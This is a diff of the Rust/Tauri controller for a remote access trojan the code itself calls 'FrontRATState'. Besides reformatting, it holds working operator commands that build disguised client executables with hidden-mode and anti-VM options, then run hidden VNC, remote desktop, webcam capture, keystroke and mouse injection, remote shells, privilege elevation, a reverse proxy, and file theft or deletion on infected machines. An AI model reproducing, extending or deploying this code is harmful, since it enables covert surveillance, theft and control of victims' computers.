@@ -1,16 +1,16 @@
-use tauri::{State, Manager};
-use crate::handlers::{ SharedTauriState, AssemblyInfo };
+use crate::handlers::{AssemblyInfo, SharedTauriState};
 use crate::utils::logger::Log;
+use base64::{engine::general_purpose, Engine as _};
 use serde::Serialize;
 use std::fs;
-use base64::{engine::general_purpose, Engine as _};
+use tauri::{State, Emitter};
 
+use crate::client::ClientWrapper;
+use crate::commands::ServerCommand;
+use crate::server::ServerWrapper;
 use tokio::net::TcpListener;
 use tokio::sync::mpsc;
 use tokio::sync::mpsc::Sender;
-use crate::commands::ServerCommand;
-use crate::server::ServerWrapper;
-use crate::client::ClientWrapper;
 
 use std::ptr::null_mut as NULL;
 use winapi::um::winuser;
@@ -19,26 +19,42 @@ use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
 
-use common::packets::{RemoteDesktopConfig, MouseClickData, KeyboardInputData, VisitWebsiteData, MessageBoxData, Process, ClientInfo, FileData};
 use crate::utils::client_builder::{apply_config, apply_rcedit, open_explorer};
+use common::packets::{
+    ClientInfo, KeyboardInputData, MessageBoxData, MouseClickData, Process, RemoteDesktopConfig,
+    VisitWebsiteData,
+};
 
 use std::process::Command;
 
-pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<Sender<ServerCommand>, String> {
+pub async fn get_channel_tx(
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<Sender<ServerCommand>, String> {
     let channel_tx = {
         let tauri_state = tauri_state.0.lock().unwrap();
-        
+
         if !tauri_state.running {
-            let log = Log { event_type: "server_error".to_string(), message: "Server not running!".to_string() };
-            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+            let log = Log {
+                event_type: "server_error".to_string(),
+                message: "Server not running!".to_string(),
+            };
+            let _ = app_handle
+                .emit("server_log", log)
+                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err("Server not running".to_string());
         }
-        
+
         if let Some(tx) = tauri_state.channel_tx.get() {
             tx.clone()
         } else {
-            let log = Log { event_type: "server_error".to_string(), message: "Server channel not initialized!".to_string() };
-            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+            let log = Log {
+                event_type: "server_error".to_string(),
+                message: "Server channel not initialized!".to_string(),
+            };
+            let _ = app_handle
+                .emit("server_log", log)
+                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err("Server channel not initialized".to_string());
         }
     };
@@ -46,13 +62,18 @@ pub async fn get_channel_tx(tauri_state: State<'_, SharedTauriState>, app_handle
     Ok(channel_tx)
 }
 
-pub async fn send_server_command(command: ServerCommand, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<(), String> {
+pub async fn send_server_command(
+    command: ServerCommand,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<(), String> {
     let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
 
-    channel_tx.send(command)
+    channel_tx
+        .send(command)
         .await
         .map_err(|e| format!("Failed to send command: {}", e))?;
-    
+
     Ok(())
 }
 
@@ -63,26 +84,28 @@ pub async fn start_server(
     app_handle: AppHandle,
 ) -> Result<String, String> {
     let (ctx, crx) = mpsc::channel::<ServerCommand>(32);
-    
+
     {
         let mut tauri_state = tauri_state.0.lock().unwrap();
-        
+
         if tauri_state.channel_tx.set(ctx.clone()).is_err() {
             return Err("false".to_string());
         }
-        
+
         tauri_state.running = true;
         tauri_state.port = port.to_string();
     };
-    
+
     ctx.send(ServerCommand::SetTauriHandle(app_handle))
-       .await
-       .map_err(|e| format!("Failed to set Tauri handle: {}", e))?;
+        .await
+        .map_err(|e| format!("Failed to set Tauri handle: {}", e))?;
 
-
-    let log = Log { event_type: "server_started".to_string(), message: "Server started on port ".to_string() + port };
+    let log = Log {
+        event_type: "server_started".to_string(),
+        message: "Server started on port ".to_string() + port,
+    };
     ctx.send(ServerCommand::Log(log)).await.unwrap();
-    
+
     let server_task = tokio::spawn(async move {
         match ServerWrapper::spawn(crx).await {
             Ok(_) => println!("Server started successfully"),
@@ -94,20 +117,17 @@ pub async fn start_server(
 
     let port = port.parse::<u16>().unwrap();
 
-
     let listener_task = tokio::spawn(async move {
         match TcpListener::bind(("0.0.0.0", port)).await {
-            Ok(listener) => {
-                loop {
-                    match listener.accept().await {
-                        Ok((socket, addr)) => {
-                            let ctx = ctx_for_listener.clone();
-                            ClientWrapper::spawn(socket, addr, ctx).await;
-                        },
-                        Err(e) => {
-                            eprintln!("Error accepting connection: {}", e);
-                            break;
-                        }
+            Ok(listener) => loop {
+                match listener.accept().await {
+                    Ok((socket, addr)) => {
+                        let ctx = ctx_for_listener.clone();
+                        ClientWrapper::spawn(socket, addr, ctx).await;
+                    }
+                    Err(e) => {
+                        eprintln!("Error accepting connection: {}", e);
+                        break;
                     }
                 }
             },
@@ -117,21 +137,26 @@ pub async fn start_server(
         }
     });
 
-
     {
         let mut tauri_state = tauri_state.0.lock().unwrap();
         tauri_state.server_task = Some(server_task);
         tauri_state.listener_task = Some(listener_task);
     }
 
-
     Ok("true".to_string())
 }
 
-
 #[tauri::command]
-pub async fn stop_server(tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    send_server_command(ServerCommand::CloseClientSessions(), tauri_state.clone(), app_handle).await?;
+pub async fn stop_server(
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::CloseClientSessions(),
+        tauri_state.clone(),
+        app_handle,
+    )
+    .await?;
 
     {
         let mut tauri_state = tauri_state.0.lock().unwrap();
@@ -139,7 +164,7 @@ pub async fn stop_server(tauri_state: State<'_, SharedTauriState>, app_handle: A
         if let Some(listener_task) = tauri_state.listener_task.take() {
             listener_task.abort();
         }
-        
+
         tauri_state.channel_tx = OnceCell::new();
         tauri_state.server_task = None;
         tauri_state.listener_task = None;
@@ -152,15 +177,17 @@ pub async fn stop_server(tauri_state: State<'_, SharedTauriState>, app_handle: A
 #[derive(Serialize)]
 pub struct FrontRATState {
     running: bool,
-    port: String
+    port: String,
 }
 
 #[tauri::command]
-pub async fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> Result<FrontRATState, FrontRATState> {
+pub async fn fetch_state(
+    tauri_state: State<'_, SharedTauriState>,
+) -> Result<FrontRATState, FrontRATState> {
     let tauri_state = tauri_state.0.lock().unwrap();
     Ok(FrontRATState {
         running: tauri_state.running.clone(),
-        port: tauri_state.port.clone()
+        port: tauri_state.port.clone(),
     })
 }
 
@@ -180,10 +207,15 @@ pub async fn build_client(
     group: &str,
     enable_hidden: bool,
     anti_vm_detection: bool,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    let log = Log { event_type: "build_client".to_string(), message: "Building client...".to_string() };
-    let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+    let log = Log {
+        event_type: "build_client".to_string(),
+        message: "Building client...".to_string(),
+    };
+    let _ = app_handle
+        .emit("server_log", log)
+        .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
 
     let config = common::ClientConfig {
         ip: ip.to_string(),
@@ -200,15 +232,25 @@ pub async fn build_client(
     };
 
     apply_config(&config).await?;
-    
+
     match apply_rcedit(&assembly_info, enable_icon, icon_path).await {
         Ok(_) => {
-            let log = Log { event_type: "build_finished".to_string(), message: "Client built successfully.".to_string() };
-            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+            let log = Log {
+                event_type: "build_finished".to_string(),
+                message: "Client built successfully.".to_string(),
+            };
+            let _ = app_handle
+                .emit("server_log", log)
+                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
         }
         Err(e) => {
-            let log = Log { event_type: "build_failed".to_string(), message: "Failed to build client.".to_string() };
-            let _ = app_handle.emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
+            let log = Log {
+                event_type: "build_failed".to_string(),
+                message: "Failed to build client.".to_string(),
+            };
+            let _ = app_handle
+                .emit("server_log", log)
+                .unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
             return Err(e.to_string());
         }
     }
@@ -221,12 +263,12 @@ pub async fn build_client(
 #[tauri::command]
 pub async fn fetch_clients(
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<Vec<ClientInfo>, String> {
     let (tx, rx) = tokio::sync::oneshot::channel();
-    
+
     send_server_command(ServerCommand::GetClients(tx), tauri_state, app_handle).await?;
-    
+
     match rx.await {
         Ok(clients) => Ok(clients),
         Err(e) => Err(format!("Failed to receive client list: {}", e)),
@@ -235,14 +277,19 @@ pub async fn fetch_clients(
 
 #[tauri::command]
 pub async fn fetch_client(
-    addr: String, 
+    addr: String,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<ClientInfo, String> {
     let (tx, rx) = tokio::sync::oneshot::channel();
-    
-    send_server_command(ServerCommand::GetClient(addr.parse().unwrap(), tx), tauri_state, app_handle).await?;
-    
+
+    send_server_command(
+        ServerCommand::GetClient(addr.parse().unwrap(), tx),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
     match rx.await {
         Ok(Some(client)) => Ok(client),
         Ok(None) => Err(format!("Client with address {} not found", addr)),
@@ -252,21 +299,45 @@ pub async fn fetch_client(
 
 #[tauri::command]
 pub async fn take_screenshot(
-    addr: String, 
-    display: i32, 
+    addr: String,
+    display: i32,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::TakeScreenshot(addr.parse().unwrap(), display.to_string()), tauri_state, app_handle).await?;
-        
+    send_server_command(
+        ServerCommand::TakeScreenshot(addr.parse().unwrap(), display.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
     Ok("Screenshot requested".to_string())
 }
 
 #[tauri::command]
-pub async fn manage_client(addr: String, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<(), String> {
+pub async fn manage_client(
+    addr: String,
+    run: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<(), String> {
     match run {
-        "disconnect" => send_server_command(ServerCommand::DisconnectClient(addr.parse().unwrap()), tauri_state, app_handle).await?,
-        "reconnect" => send_server_command(ServerCommand::ReconnectClient(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "disconnect" => {
+            send_server_command(
+                ServerCommand::DisconnectClient(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "reconnect" => {
+            send_server_command(
+                ServerCommand::ReconnectClient(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
         _ => {}
     }
 
@@ -275,29 +346,42 @@ pub async fn manage_client(addr: String, run: &str, tauri_state: State<'_, Share
 
 #[tauri::command]
 pub async fn start_remote_desktop(
-    addr: &str, 
-    display: i32, 
-    quality: u8, 
-    fps: u8, 
+    addr: &str,
+    display: i32,
+    quality: u8,
+    fps: u8,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::StartRemoteDesktop(addr.parse().unwrap(), RemoteDesktopConfig {
-        display,
-        quality,
-        fps,
-    }), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::StartRemoteDesktop(
+            addr.parse().unwrap(),
+            RemoteDesktopConfig {
+                display,
+                quality,
+                fps,
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Remote desktop started".to_string())
 }
 
 #[tauri::command]
 pub async fn stop_remote_desktop(
-    addr: &str, 
+    addr: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::StopRemoteDesktop(addr.parse().unwrap()), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::StopRemoteDesktop(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Remote desktop stopped".to_string())
 }
@@ -312,16 +396,24 @@ pub async fn send_mouse_click(
     action_type: i32,
     scroll_amount: Option<i32>,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::MouseClick(addr.parse().unwrap(), MouseClickData {
-        display,
-        x: x as i32,
-        y: y as i32,
-        click_type,
-        action_type,
-        scroll_amount: scroll_amount.unwrap_or(0),
-    }), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::MouseClick(
+            addr.parse().unwrap(),
+            MouseClickData {
+                display,
+                x: x as i32,
+                y: y as i32,
+                click_type,
+                action_type,
+                scroll_amount: scroll_amount.unwrap_or(0),
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Mouse click sent".to_string())
 }
@@ -331,12 +423,20 @@ pub async fn visit_website(
     addr: &str,
     url: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::VisitWebsite(addr.parse().unwrap(), VisitWebsiteData {
-        visit_type: "normal".to_string(),
-        url: url.to_string(),
-    }), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::VisitWebsite(
+            addr.parse().unwrap(),
+            VisitWebsiteData {
+                visit_type: "normal".to_string(),
+                url: url.to_string(),
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Website visited".to_string())
 }
@@ -359,15 +459,14 @@ pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
                 "yes_no" => winuser::MB_YESNO,
                 "retry_cancel" => winuser::MB_RETRYCANCEL,
                 _ => winuser::MB_OK,
-            }) |
-                (match icon {
-                    "info" => winuser::MB_ICONINFORMATION,
-                    "warning" => winuser::MB_ICONWARNING,
-                    "error" => winuser::MB_ICONERROR,
-                    "question" => winuser::MB_ICONQUESTION,
-                    "asterisk" => winuser::MB_ICONASTERISK,
-                    _ => winuser::MB_ICONINFORMATION,
-                })
+            }) | (match icon {
+                "info" => winuser::MB_ICONINFORMATION,
+                "warning" => winuser::MB_ICONWARNING,
+                "error" => winuser::MB_ICONERROR,
+                "question" => winuser::MB_ICONQUESTION,
+                "asterisk" => winuser::MB_ICONASTERISK,
+                _ => winuser::MB_ICONINFORMATION,
+            }),
         );
     }
 }
@@ -380,14 +479,22 @@ pub async fn send_messagebox(
     button: &str,
     icon: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::ShowMessageBox(addr.parse().unwrap(), MessageBoxData {
-        title: title.to_string(),
-        message: message.to_string(),
-        button: button.to_string(),
-        icon: icon.to_string(),
-    }), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::ShowMessageBox(
+            addr.parse().unwrap(),
+            MessageBoxData {
+                title: title.to_string(),
+                message: message.to_string(),
+                button: button.to_string(),
+                icon: icon.to_string(),
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Messagebox sent".to_string())
 }
@@ -396,9 +503,14 @@ pub async fn send_messagebox(
 pub async fn elevate_client(
     addr: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::ElevateClient(addr.parse().unwrap()), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::ElevateClient(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Client elevated".to_string())
 }
@@ -408,9 +520,14 @@ pub async fn handle_system_command(
     addr: &str,
     run: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::ManageSystem(addr.parse().unwrap(), run.to_string()), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::ManageSystem(addr.parse().unwrap(), run.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("System command sent".to_string())
 }
@@ -419,9 +536,14 @@ pub async fn handle_system_command(
 pub async fn process_list(
     addr: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::GetProcessList(addr.parse().unwrap()), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::GetProcessList(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Process list sent".to_string())
 }
@@ -432,21 +554,48 @@ pub async fn kill_process(
     pid: i32,
     name: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::KillProcess(addr.parse().unwrap(), Process {
-        pid: pid as usize,
-        name: name.to_string(),
-    }), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::KillProcess(
+            addr.parse().unwrap(),
+            Process {
+                pid: pid as usize,
+                name: name.to_string(),
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Process killed".to_string())
 }
 
 #[tauri::command]
-pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {    
+pub async fn manage_shell(
+    addr: &str,
+    run: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
     match run {
-        "start" => send_server_command(ServerCommand::StartShell(addr.parse().unwrap()), tauri_state, app_handle).await?,
-        "stop" => send_server_command(ServerCommand::ExitShell(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "start" => {
+            send_server_command(
+                ServerCommand::StartShell(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "stop" => {
+            send_server_command(
+                ServerCommand::ExitShell(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
         _ => {}
     }
 
@@ -454,9 +603,19 @@ pub async fn manage_shell(addr: &str, run: &str, tauri_state: State<'_, SharedTa
 }
 
 #[tauri::command]
-pub async fn execute_shell_command(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    send_server_command(ServerCommand::ShellCommand(addr.parse().unwrap(), run.to_string()), tauri_state, app_handle).await?;
-    
+pub async fn execute_shell_command(
+    addr: &str,
+    run: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::ShellCommand(addr.parse().unwrap(), run.to_string()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
     Ok("Shell command sent".to_string())
 }
 
@@ -466,18 +625,38 @@ pub async fn read_files(
     run: &str,
     path: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
     match run {
-        "previous_dir" => send_server_command(ServerCommand::PreviousDir(addr.parse().unwrap()), tauri_state, app_handle).await?,
-        "view_dir" => send_server_command(ServerCommand::ViewDir(addr.parse().unwrap(), path.to_string()), tauri_state, app_handle).await?,
-        "available_disks" => send_server_command(ServerCommand::AvailableDisks(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "previous_dir" => {
+            send_server_command(
+                ServerCommand::PreviousDir(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "view_dir" => {
+            send_server_command(
+                ServerCommand::ViewDir(addr.parse().unwrap(), path.to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "available_disks" => {
+            send_server_command(
+                ServerCommand::AvailableDisks(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
         _ => {}
     }
 
     Ok("File operation sent".to_string())
 }
-
 
 #[tauri::command]
 pub async fn manage_file(
@@ -485,36 +664,80 @@ pub async fn manage_file(
     run: &str,
     file: &str,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
     match run {
-        "download_file" => send_server_command(ServerCommand::DownloadFile(addr.parse().unwrap(), file.to_string()), tauri_state, app_handle).await?,
-        "remove_file" => send_server_command(ServerCommand::RemoveFile(addr.parse().unwrap(), file.to_string()), tauri_state, app_handle).await?,
-        "remove_dir" => send_server_command(ServerCommand::RemoveDir(addr.parse().unwrap(), file.to_string()), tauri_state, app_handle).await?,
+        "download_file" => {
+            send_server_command(
+                ServerCommand::DownloadFile(addr.parse().unwrap(), file.to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "remove_file" => {
+            send_server_command(
+                ServerCommand::RemoveFile(addr.parse().unwrap(), file.to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "remove_dir" => {
+            send_server_command(
+                ServerCommand::RemoveDir(addr.parse().unwrap(), file.to_string()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
         _ => {}
     }
 
     Ok("File operation sent".to_string())
 }
-    
+
 #[tauri::command]
-pub async fn start_reverse_proxy(addr: &str, port: &str, localport: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    send_server_command(ServerCommand::StartReverseProxy(addr.parse().unwrap(), port.to_string(), localport.to_string()), tauri_state, app_handle).await?;
+pub async fn start_reverse_proxy(
+    addr: &str,
+    port: &str,
+    localport: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StartReverseProxy(
+            addr.parse().unwrap(),
+            port.to_string(),
+            localport.to_string(),
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Reverse proxy started".to_string())
 }
 
 #[tauri::command]
-pub async fn stop_reverse_proxy(addr: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    send_server_command(ServerCommand::StopReverseProxy(addr.parse().unwrap()), tauri_state, app_handle).await?;
+pub async fn stop_reverse_proxy(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::StopReverseProxy(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Reverse proxy stopped".to_string())
 }
 
 #[tauri::command]
 pub async fn read_icon(path: &str, _app_handle: AppHandle) -> Result<String, String> {
-    let icon = fs::read(path)
-        .map_err(|e| format!("Failed to read icon: {}", e))?;
+    let icon = fs::read(path).map_err(|e| format!("Failed to read icon: {}", e))?;
 
     let base64_icon = general_purpose::STANDARD.encode(&icon);
 
@@ -523,11 +746,10 @@ pub async fn read_icon(path: &str, _app_handle: AppHandle) -> Result<String, Str
 
 #[tauri::command]
 pub async fn read_exe(path: &str) -> Result<AssemblyInfo, String> {
-    let _ = fs::read(path)
-        .map_err(|e| format!("Failed to read exe: {}", e))?;
+    let _ = fs::read(path).map_err(|e| format!("Failed to read exe: {}", e))?;
 
-    let info = get_assembly_info(path, "target/rcedit.exe").unwrap();
-    
+    let info = get_assembly_info(path, "rcedit.exe").unwrap();
+
     Ok(info)
 }
 
@@ -541,7 +763,9 @@ pub fn get_assembly_info(exe_path: &str, rcedit_path: &str) -> Result<AssemblyIn
             .output();
 
         match output {
-            Ok(out) if out.status.success() => String::from_utf8_lossy(&out.stdout).trim().to_string(),
+            Ok(out) if out.status.success() => {
+                String::from_utf8_lossy(&out.stdout).trim().to_string()
+            }
             Ok(out) => {
                 let err = String::from_utf8_lossy(&out.stderr);
                 eprintln!("Failed to get {}: {}", key, err.trim());
@@ -576,33 +800,76 @@ pub async fn send_keyboard_input(
     ctrl_pressed: bool,
     caps_lock: bool,
     tauri_state: State<'_, SharedTauriState>,
-    app_handle: AppHandle
+    app_handle: AppHandle,
 ) -> Result<String, String> {
-    send_server_command(ServerCommand::KeyboardInput(addr.parse().unwrap(), KeyboardInputData {
-        key_code,
-        character: character.to_string(),
-        is_keydown,
-        shift_pressed,
-        ctrl_pressed,
-        caps_lock,
-    }), tauri_state, app_handle).await?;
+    send_server_command(
+        ServerCommand::KeyboardInput(
+            addr.parse().unwrap(),
+            KeyboardInputData {
+                key_code,
+                character: character.to_string(),
+                is_keydown,
+                shift_pressed,
+                ctrl_pressed,
+                caps_lock,
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Keyboard input sent".to_string())
 }
 
 #[tauri::command]
-pub async fn request_webcam(addr: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
-    send_server_command(ServerCommand::RequestWebcam(addr.parse().unwrap()), tauri_state, app_handle).await?;
+pub async fn request_webcam(
+    addr: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::RequestWebcam(addr.parse().unwrap()),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
 
     Ok("Webcam request sent".to_string())
 }
 
 #[tauri::command]
-pub async fn manage_hvnc(addr: &str, run: &str, tauri_state: State<'_, SharedTauriState>, app_handle: AppHandle) -> Result<String, String> {
+pub async fn manage_hvnc(
+    addr: &str,
+    run: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
     match run {
-        "start" => send_server_command(ServerCommand::StartHVNC(addr.parse().unwrap()), tauri_state, app_handle).await?,
-        "stop" => send_server_command(ServerCommand::StopHVNC(addr.parse().unwrap()), tauri_state, app_handle).await?,
-        "open_explorer" => send_server_command(ServerCommand::OpenExplorer(addr.parse().unwrap()), tauri_state, app_handle).await?,
+        "start" => {
+            send_server_command(
+                ServerCommand::StartHVNC(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "stop" => {
+            send_server_command(
+                ServerCommand::StopHVNC(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
+        "open_explorer" => {
+            send_server_command(
+                ServerCommand::OpenExplorer(addr.parse().unwrap()),
+                tauri_state,
+                app_handle,
+            )
+            .await?
+        }
         _ => {}
     }
     Ok("HVNC command sent".to_string())
@@ -672,4 +939,3 @@ pub async fn upload_file_to_folder(
 
     Ok("File upload command sent".to_string())
 }
-
